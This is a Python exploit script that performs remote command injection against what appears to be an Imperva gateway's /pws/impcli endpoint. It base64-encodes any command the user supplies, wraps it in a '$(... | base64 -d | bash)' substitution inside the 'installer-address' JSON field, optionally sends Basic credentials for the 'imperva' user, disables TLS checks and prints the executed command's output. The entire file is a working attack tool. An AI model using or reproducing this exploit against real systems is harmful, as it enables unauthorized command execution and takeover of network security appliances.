#!/usr/bin/env python3

import argparse
import sys
import base64
import json
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument("-t", metavar="target", help="Target hostname/IP address", type=str, required=True)
parser.add_argument("-p", metavar="password", help="Agent registration password for 'imperva' user. Provide either a single password or a file containing passwords.", type=str, required=False)
parser.add_argument("cmd", help="Command to be executed on target", type=str)
args = parser.parse_args()

# /pws/inception is another vulnerable endpoint
target_url = f"https://{args.t}/pws/impcli"
session = requests.Session()
session.get(target_url, verify=False)

split_mark = "SPLIT_MARK"
payload = f"$(printf {base64.b64encode(args.cmd.encode()).decode()} | base64 -d | bash)"
headers = {}

if args.p is not None:
    password = args.p.strip()
    if password.startswith("@"):
        password_file = password[1:]
        try:
            with open(password_file, "r") as file:
                passwords = file.readlines()
            passwords = [pw.strip() for pw in passwords if pw.strip()]
            if len(passwords) == 0:
                print("[!] Password file is empty. Please provide a valid password file.")
                sys.exit(1)
            headers["Authorization"] = "Basic " + base64.b64encode(f"imperva:{passwords[0]}".encode()).decode()
        except FileNotFoundError:
            print("[!] Password file not found. Please provide a valid password file.")
            sys.exit(1)
    else:
        headers["Authorization"] = "Basic " + base64.b64encode(f"imperva:{password}".encode()).decode()

body = {
    "command": "impctl server status",
    "parameters": {
        "broadcast": True,
        "installer-address": f"127.0.0.1 {split_mark}{payload}{split_mark}"
    }
}

print(f"[*] Sending payload to {target_url}...")
response = session.post(target_url, headers=headers, data=json.dumps(body), verify=False)

if split_mark in response.text:
    print("[*] Received command execution output:")
    print(response.text.split(split_mark)[1])
elif response.status_code == requests.codes.unauthorized:
    print("[!] Gateway Authentication required, please provide a valid password.")
else:
    print("[!] Failed to execute command on target.")
